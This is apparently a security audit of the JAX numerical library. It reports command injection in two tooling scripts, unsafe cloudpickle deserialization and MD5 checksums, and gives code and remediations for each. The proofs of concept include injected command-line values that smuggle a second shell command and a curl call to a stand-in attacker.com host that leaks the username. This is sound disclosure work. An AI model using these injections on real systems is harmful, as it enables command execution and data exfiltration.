CVE-Eligible

JAX is Google's high-performance numerical computing library for Python. Its core API shows strong security hygiene: no hardcoded secrets were found, the main GitHub Actions workflows use SHA-pinned actions, dependencies are modern and free of known CVEs (numpy>=2.0, scipy>=1.13, ml_dtypes>=0.5.0). The primary confirmed security issues are in peripheral tooling scripts: a shell injection vulnerability in pgo_nsys_converter.py (a GPU profiling tool) where user-supplied CLI arguments are concatenated into a shell=True subprocess command, and a command injection in the saved_model_main.py example script via os.system() with a user-controlled path. Additionally, a cloudpickle.loads() is used in the distributed execution (colocated_python) subsystem and deserialization path of compiled executables — while these are currently confined to internal use with trusted data, they represent a latent deserialization risk if the data flow is ever extended to accept external inputs. CI/CD security is strong with SHA-pinned actions throughout the main testing and release pipelines.

Confirmed Vulnerabilities

HIGH Command Injection via shell=True with User-Controlled Path in pgo_nsys_converter.py JAX-001
File: jax/tools/pgo_nsys_converter.py, line 75 CWE: CWE-78 (OS Command Injection) CVSS (est): 7.8

The GPU profiling tool pgo_nsys_converter.py constructs a shell command by f-string interpolating user-supplied argument values (--profile_path) into a command string, which is then passed to subprocess.call(..., shell=True). An attacker or user who provides a crafted --profile_path value containing shell metacharacters can execute arbitrary commands on the local system.

Vulnerable Code

# jax/tools/pgo_nsys_converter.py, lines 30-35 (arg parsing)
parser.add_argument("--profile_path", type=str, help="path to nsys profile")
# ...
args = parser.parse_args()
profile_folder = os.path.join(os.path.split(args.profile_path)[0], '')
pgle_folder = os.path.join(os.path.split(args.pgle_output_path)[0], '')

# Line 75 (vulnerable):
clean_command = f"rm {profile_folder}/*.sqlite; rm {pgle_folder}/*.csv"
subprocess.call(clean_command, shell=True)  # shell=True with user input

Proof of Concept

# Attacker runs:
python jax/tools/pgo_nsys_converter.py \
  --profile_path "/tmp/nsys/1; id > /tmp/pwned" \
  --pgle_output_path "/tmp/output.pbtxt"

# Resulting command executed:
# rm /tmp/nsys/1; id > /tmp/pwned/*.sqlite; rm /tmp/output/*.csv
# The "id" command executes and outputs to /tmp/pwned

Exploitability

This tool is installed as part of the JAX package and is callable by any user with access to run JAX tools. While typically run by ML engineers managing GPU profiling pipelines, the attack surface includes any system where JAX tooling is exposed (e.g., shared ML clusters, Jupyter environments). The impact is local command execution as the user running the script.

Remediation

# Replace shell=True string command with a list-based approach:
import glob
import os

# Remove .sqlite files
for f in glob.glob(os.path.join(profile_folder, '*.sqlite')):
    os.remove(f)
# Remove .csv files
for f in glob.glob(os.path.join(pgle_folder, '*.csv')):
    os.remove(f)
MEDIUM Command Injection via os.system() with User-Controlled Model Path in Example Script JAX-002
File: jax/experimental/jax2tf/examples/saved_model_main.py, line 159 CWE: CWE-78 (OS Command Injection) CVSS (est): 6.3

The TensorFlow SavedModel example script uses os.system() to call the TensorFlow CLI tool saved_model_cli, embedding the model_dir path directly into the command string. The path is derived from the --model_path command-line flag without any sanitization. Shell metacharacters in the path value cause arbitrary command execution.

Vulnerable Code

# jax/experimental/jax2tf/examples/saved_model_main.py
# Flag definition (line 48):
_MODEL_PATH = flags.DEFINE_string("model_path", "/tmp/jax2tf/saved_models", ...)

# Path construction (lines 183-189):
def savedmodel_dir(with_version=True):
    model_dir = os.path.join(_MODEL_PATH.value, _MODEL.value + ...)
    if with_version:
        model_dir = os.path.join(model_dir, str(_MODEL_VERSION.value))
    return model_dir

# Vulnerable injection point (lines 157-160):
def print_model(model_dir: str):
    cmd = f"saved_model_cli show --all --dir {model_dir}"
    print(cmd)
    os.system(cmd)  # user-controlled model_dir via --model_path

Proof of Concept

python saved_model_main.py --model_path="/tmp/models/1; curl http://attacker.com/$(whoami)"
# Executes: saved_model_cli show --all --dir /tmp/models/1; curl http://attacker.com/<username>

Severity Justification

This is in an "examples" directory and is less likely to be run in automated pipelines. However, JAX examples are commonly run by practitioners who may receive crafted model paths. Severity rated Medium due to the example/tool context and local-only exploitation.

Remediation

# Use subprocess.run with a list instead of os.system with a string:
import subprocess
subprocess.run(["saved_model_cli", "show", "--all", "--dir", model_dir],
               check=True)
MEDIUM Unsafe cloudpickle.loads() Deserialization in Distributed Execution Path JAX-003
File: jax/experimental/colocated_python/serialization.py:278, jax/_src/pickle_util.py:67, jax/experimental/serialize_executable.py:70 CWE: CWE-502 (Deserialization of Untrusted Data) CVSS (est): 5.9 (requires attacker control of serialized bytes)

JAX uses cloudpickle.loads() in three locations: the colocated Python distributed execution subsystem, the generic pickle utility module, and the compiled executable serialization path. cloudpickle.loads() (like pickle.loads()) executes arbitrary Python code during deserialization. Currently all callers appear to serialize data internally before deserializing it (same-process or same-trust-domain), but the _deserialize() function and deserialize_and_load() accept arbitrary bytes parameters from callers, creating a risk if any external data is ever passed in.

Vulnerable Code

# jax/experimental/colocated_python/serialization.py:262-279
def _deserialize(serialized: bytes) -> Any:
  """DO NOT USE THIS FUNCTION EXCEPT FOR THE INTERNAL IMPLEMENTATION OF colocated_python."""
  if cloudpickle is None:
    raise ModuleNotFoundError('No module named "cloudpickle"')
  _common_obj_state.common_obj = []
  try:
    return cloudpickle.loads(serialized)   # executes arbitrary Python code
  finally:
    _common_obj_state.common_obj = None

# jax/experimental/serialize_executable.py:69-71
(unloaded_executable, args_info_flat, no_kwargs) = _JaxPjrtUnpickler(
    io.BytesIO(serialized), backend, execution_devices).load()
# ^ serialized is a bytes parameter passed in by the caller

Current Risk Scope

The deserialize_and_load() function in serialize_executable.py is public API — any caller can pass arbitrary bytes as the serialized parameter. If those bytes originate from network storage (e.g., loading a saved compiled artifact from a shared filesystem or cloud storage), a malicious artifact would achieve RCE when loaded.

Remediation

Add documentation warnings to public APIs that accept serialized bytes, making clear that the data must come from a trusted source. For long-term hardening, consider migrating to a format that does not execute code on load (e.g., MessagePack, Protocol Buffers, or a custom restricted deserializer). At minimum, add a user-visible warning when loading externally-sourced artifacts.

LOW MD5 Used for Integrity Check of Downloaded ONNX Model in Example JAX-004
File: examples/onnx2xla.py, line 115 CWE: CWE-328 (Use of Weak Hash) CVSS (est): 3.1

The ONNX-to-XLA example script downloads an ONNX model from GitHub and verifies its integrity using an MD5 checksum. MD5 is cryptographically broken and vulnerable to collision attacks, making it unsuitable for integrity verification of downloaded files (an attacker with a MITM position could craft a malicious ONNX file with a matching MD5 hash).

Vulnerable Code

# examples/onnx2xla.py, lines 114-115
url = ('https://github.com/onnx/models/blob/81c4779096d1205edd0b809e191a924c58c38fef/mnist/model.onnx?raw=true')
download = urllib.request.urlopen(url).read()
if hashlib.md5(download).hexdigest() != 'bc8ad9bd19c5a058055dc18d0f089dad':
    print("onnx file checksum mismatch")
    sys.exit(1)

Additionally, the URL uses a pinned commit SHA in the GitHub path (which is positive), but the download goes over HTTPS to a mutable URL that could be replaced.

Remediation

# Replace MD5 with SHA-256:
import hashlib
digest = hashlib.sha256(download).hexdigest()
EXPECTED_SHA256 = "..."  # pre-computed SHA-256 of the file
if digest != EXPECTED_SHA256:
    print(f"onnx file checksum mismatch: {digest}")
    sys.exit(1)
